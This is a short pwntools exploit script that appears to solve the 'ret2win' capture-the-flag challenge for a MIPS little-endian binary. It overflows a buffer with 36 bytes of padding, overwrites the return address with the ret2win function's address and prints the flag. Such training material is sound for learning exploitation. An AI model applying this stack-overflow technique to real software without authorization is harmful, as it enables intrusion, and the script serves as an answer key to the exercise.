from pwn import *

BINARY = "./ret2win_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

p = process(BINARY)

rop = b"A"*36
rop += p32(ELF.symbols["ret2win"])
log.success(f"ROP chain : {rop}")

p.recv()
p.sendline(rop)
flag = p.recvall(timeout=0.008).split(b'\n')[-3]
log.success(f"FLAG : {flag}")
